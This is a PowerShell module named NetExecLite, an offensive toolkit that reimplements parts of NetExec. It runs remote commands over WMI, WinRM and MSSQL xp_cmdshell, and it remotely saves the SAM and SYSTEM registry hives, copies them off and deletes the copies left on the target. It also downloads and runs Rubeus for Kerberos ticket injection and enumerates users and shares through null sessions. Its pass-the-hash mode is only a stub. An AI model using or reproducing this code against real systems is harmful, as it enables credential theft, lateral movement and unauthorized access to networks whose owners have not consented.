# NetExecLite.psm1
# Requiere PowerShell 5.1+ (7 recomendado)

$Script:ModVer = '2.1.0'

function Get-NECredential {
    param($User,$Pass,$Hash)
    if ($Hash) {
        Write-Host '[+] Pass-the-Hash mode' -ForegroundColor Cyan
        # Nota: Pass-the-Hash requiere APIs nativas o herramientas externas
        # El hash se almacena en una variable de script para uso posterior
        $Script:LastHash = $Hash
        $sec = New-Object System.Security.SecureString
        [pscredential]::new($User,$sec)
    } else {
        $sec = ConvertTo-SecureString $Pass -AsPlainText -Force
        [pscredential]::new($User,$sec)
    }
}

function Invoke-NERdpCheck {
    param($Cred,$Computer)
    $t = Test-NetConnection -ComputerName $Computer -Port 3389 -WarningAction SilentlyContinue
    if (-not $t.TcpTestSucceeded) { Write-Warning 'RDP (3389) no accesible'; return }
    Add-Type -AssemblyName System.DirectoryServices.AccountManagement
    $pc = [System.DirectoryServices.AccountManagement.PrincipalContext]::new('Domain',$Computer)
    $ok = $pc.ValidateCredentials($Cred.UserName,$Cred.GetNetworkCredential().Password)
    Write-Host "[+] RDP accessible y creds válidas: $ok" -ForegroundColor $(if($ok){'Green'}else{'Red'})
}

function Invoke-NEMSSQL {
    param($Cred,$Computer,$Cmd,$Port=1433)
    $conn = [System.Data.SqlClient.SqlConnection]::new()
    $conn.ConnectionString = "Server=$Computer,$Port;Database=master;User ID=$($Cred.UserName);Password=$($Cred.GetNetworkCredential().Password);"
    try {
        $conn.Open()
        $en = 'sp_configure ''show advanced options'',1;RECONFIGURE;sp_configure ''xp_cmdshell'',1;RECONFIGURE;'
        $null = [System.Data.SqlClient.SqlCommand]::new($en,$conn).ExecuteNonQuery()
        $sql = "xp_cmdshell '$Cmd'"
        $reader = [System.Data.SqlClient.SqlCommand]::new($sql,$conn).ExecuteReader()
        while ($reader.Read()) { if ($reader[0]) { $reader[0] } }
        $reader.Close()
    } catch { Write-Error "MSSQL: $_" } finally { $conn.Close() }
}

function Invoke-NEKerberos {
    param($Ticket)
    $rubeus = "$env:TEMP\Rubeus.exe"
    if (-not (Test-Path $rubeus)) {
        Write-Host '[+] Descargando Rubeus...' -ForegroundColor Yellow
        Invoke-WebRequest https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe -OutFile $rubeus
    }
    & $rubeus ptt /ticket:$(Resolve-Path $Ticket).Path | Out-String -Stream | Write-Host
}

function Invoke-NetExecLite {
<#
.SYNOPSIS
NetExecLite – NetExec en PowerShell puro.
#>
[CmdletBinding(DefaultParameterSetName='Pass')]
param(
    [Parameter(Mandatory)][string]$Target,
    [Parameter(Mandatory)][string]$Username,
    [Parameter(ParameterSetName='Pass')][string]$Password,
    [Parameter(ParameterSetName='Hash')][string]$Hash,
    [string]$Command,
    [ValidateSet('WMI','WinRM','LDAP','SecretsDump','RDP','MSSQL','Kerberos')][string]$Module='WMI',
    [string]$TicketPath,
    [int]$SqlPort = 1433
)

    $cred = Get-NECredential -User $Username -Pass $Password -Hash $Hash

    switch ($Module) {
        'WMI' {
            $r = Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $Command -ComputerName $Target -Credential $cred
            if ($r.ReturnValue -eq 0) { Write-Host "[+] WMI OK – PID: $($r.ProcessId)" -ForegroundColor Green }
            else { Write-Warning "WMI error $($r.ReturnValue)" }
        }
        'WinRM' {
            $s = New-PSSession -ComputerName $Target -Credential $cred -ErrorAction Stop
            $out = Invoke-Command -Session $s -ScriptBlock { param($c) iex $c } -ArgumentList $Command
            $out; Remove-PSSession $s
        }
        'LDAP' {
            $dom = (Get-WmiObject -Class Win32_ComputerSystem -ComputerName $Target -Credential $cred).Domain
            $s = [adsisearcher]'(&(objectClass=user))'
            $s.SearchRoot = [adsi]"LDAP://$dom"
            $s.PageSize = 1000
            $s.FindAll() | ForEach-Object {
                [pscustomobject]@{
                    Username    = $_.Properties.samaccountname[0]
                    Description = $_.Properties.description[0]
                }
            } | Format-Table -AutoSize
        }
        'SecretsDump' {
            Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd /c reg save hklm\sam C:\Windows\Temp\sam.save" -ComputerName $Target -Credential $cred | Out-Null
            Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd /c reg save hklm\system C:\Windows\Temp\system.save" -ComputerName $Target -Credential $cred | Out-Null
            Copy-Item "\\$Target\C$\Windows\Temp\sam.save" -Force
            Copy-Item "\\$Target\C$\Windows\Temp\system.save" -Force
            Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd /c del C:\Windows\Temp\sam.save C:\Windows\Temp\system.save" -ComputerName $Target -Credential $cred | Out-Null
            Write-Host '[+] sam.save & system.save descargados. Usa secretsdump.py para extraer hashes.' -ForegroundColor Magenta
        }
        'RDP'  { Invoke-NERdpCheck -Cred $cred -Computer $Target }
        'MSSQL' {
            if (-not $Command) { Write-Error 'MSSQL requiere -Command'; break }
            Invoke-NEMSSQL -Cred $cred -Computer $Target -Cmd $Command -Port $SqlPort
        }
        'Kerberos' {
            if (-not $TicketPath) { Write-Error 'Kerberos requiere -TicketPath'; break }
            Invoke-NEKerberos -Ticket $TicketPath
        }
        default { Write-Warning "Módulo no implementado" }
    }
}

function Invoke-NESMBAnonymous {
    param($Target)
    # 1) Conectar con credenciales nulas
    $nullCred = [pscredential]::new('', (ConvertTo-SecureString '' -AsPlainText -Force))
    try {
        $s = New-PSSession -ComputerName $Target -Credential $nullCred -Authentication Negotiate -ErrorAction Stop
        Write-Host '[+] Sesión anónima establecida (null session)' -ForegroundColor Green
        Remove-PSSession $s
        return $true
    } catch {
        Write-Host '[-] Null session fallida' -ForegroundColor Red
        return $false
    }
}

function Get-NESMBShares {
    param($Target,$Cred)
    try {
        if ($Cred) {
            $shares = Get-SmbShare -CimSession (New-CimSession -ComputerName $Target -Credential $Cred) -ErrorAction Stop
        } else {
            $shares = Get-SmbShare -CimSession (New-CimSession -ComputerName $Target -SessionOption (New-CimSessionOption -Protocol Dcom)) -ErrorAction Stop
        }
        $shares | Select Name,Path,Description | Format-Table -AutoSize
    } catch {
        Write-Error "Shares: $_"
    }
}

function Get-NESMBUsers {
    param($Target,$Cred)
    # Usa SAMR vía WMI cuando no hay creds
    try {
        if (-not $Cred) {
            # Null session fallback: usa WMI con credenciales vacías
            $users = Get-WmiObject -Class Win32_UserAccount -ComputerName $Target -Credential ([pscredential]::new('',(ConvertTo-SecureString '' -AsPlainText -Force))) -ErrorAction Stop
        } else {
            $users = Get-WmiObject -Class Win32_UserAccount -ComputerName $Target -Credential $Cred -ErrorAction Stop
        }
        $users | Select Name,Disabled,Lockout,PasswordChangeable,PasswordExpires,PasswordRequired | Format-Table -AutoSize
    } catch {
        Write-Error "Users: $_"
    }
}

function Invoke-NESMB {
    param($Target,$Cred)
    Write-Host "[=== Módulo SMB ===]" -ForegroundColor Cyan
    if (-not $Cred) {
        $anon = Invoke-NESMBAnonymous -Target $Target
        if (-not $anon) { return }
    }
    Write-Host "`n[+] Shares:" -ForegroundColor Yellow
    Get-NESMBShares -Target $Target -Cred $Cred
    Write-Host "`n[+] Users:" -ForegroundColor Yellow
    Get-NESMBUsers -Target $Target -Cred $Cred
}

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Collections.Generic;

public class SamrNative {
    [DllImport("netapi32.dll", CharSet = CharSet.Unicode)]
    public static extern int NetUserEnum(string servername, int level, int filter, out IntPtr bufptr, int prefmaxlen, out int entriesread, out int totalentries, ref int resume_handle);

    [DllImport("netapi32.dll", CharSet = CharSet.Unicode)]
    public static extern int NetLocalGroupEnum(string servername, int level, out IntPtr bufptr, int prefmaxlen, out int entriesread, out int totalentries, ref int resume_handle);

    [DllImport("netapi32.dll", CharSet = CharSet.Unicode)]
    public static extern int NetShareEnum(string servername, int level, out IntPtr bufptr, int prefmaxlen, out int entriesread, out int totalentries, ref int resume_handle);

    [DllImport("netapi32.dll")]
    public static extern int NetApiBufferFree(IntPtr buffer);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct SHARE_INFO_1 {
        public string shi1_netname;
        public uint shi1_type;
        public string shi1_remark;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct USER_INFO_0 {
        public string usri0_name;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct LOCALGROUP_INFO_0 {
        public string lgrpi0_name;
    }
}
"@ -IgnoreWarnings

function Get-SamrUsers {
    param($Server)
    $entries = 0; $total = 0; $handle = 0; $ptr = [IntPtr]::Zero
    $res = [SamrNative]::NetUserEnum($Server, 0, 0, [ref]$ptr, -1, [ref]$entries, [ref]$total, [ref]$handle)
    if ($res -eq 0) {
        $offset = $ptr.ToInt64()
        $userList = for ($i = 0; $i -lt $entries; $i++) {
            $usr = [System.Runtime.InteropServices.Marshal]::PtrToStructure([IntPtr]::new($offset), [SamrNative+USER_INFO_0])
            $offset += [System.Runtime.InteropServices.Marshal]::SizeOf([SamrNative+USER_INFO_0])
            $usr.usri0_name
        }
        [SamrNative]::NetApiBufferFree($ptr) | Out-Null
        $userList
    } else {
        Write-Warning "NetUserEnum error: $res"
    }
}

function Get-SamrGroups {
    param($Server)
    $entries = 0; $total = 0; $handle = 0; $ptr = [IntPtr]::Zero
    $res = [SamrNative]::NetLocalGroupEnum($Server, 0, [ref]$ptr, -1, [ref]$entries, [ref]$total, [ref]$handle)
    if ($res -eq 0) {
        $offset = $ptr.ToInt64()
        $grpList = for ($i = 0; $i -lt $entries; $i++) {
            $grp = [System.Runtime.InteropServices.Marshal]::PtrToStructure([IntPtr]::new($offset), [SamrNative+LOCALGROUP_INFO_0])
            $offset += [System.Runtime.InteropServices.Marshal]::SizeOf([SamrNative+LOCALGROUP_INFO_0])
            $grp.lgrpi0_name
        }
        [SamrNative]::NetApiBufferFree($ptr) | Out-Null
        $grpList
    } else {
        Write-Warning "NetLocalGroupEnum error: $res"
    }
}

function Get-SamrShares {
    param($Server)
    $entries = 0; $total = 0; $handle = 0; $ptr = [IntPtr]::Zero
    $res = [SamrNative]::NetShareEnum($Server, 1, [ref]$ptr, -1, [ref]$entries, [ref]$total, [ref]$handle)
    if ($res -eq 0) {
        $offset = $ptr.ToInt64()
        $shareList = for ($i = 0; $i -lt $entries; $i++) {
            $shr = [System.Runtime.InteropServices.Marshal]::PtrToStructure([IntPtr]::new($offset), [SamrNative+SHARE_INFO_1])
            $offset += [System.Runtime.InteropServices.Marshal]::SizeOf([SamrNative+SHARE_INFO_1])
            [pscustomobject]@{
                Name        = $shr.shi1_netname
                Type        = $shr.shi1_type
                Description = $shr.shi1_remark
            }
        }
        [SamrNative]::NetApiBufferFree($ptr) | Out-Null
        $shareList
    } else {
        Write-Warning "NetShareEnum error: $res"
    }
}

# ---------- Auto-complete ----------
Register-ArgumentCompleter -CommandName Invoke-NetExecLite -ParameterName Module -ScriptBlock {
    param($c,$p)
    @('WMI','WinRM','LDAP','SecretsDump','RDP','MSSQL','Kerberos') | Where-Object { $_ -like "$($p -replace '"')" }
}

Export-ModuleMember -Function Invoke-NetExecLite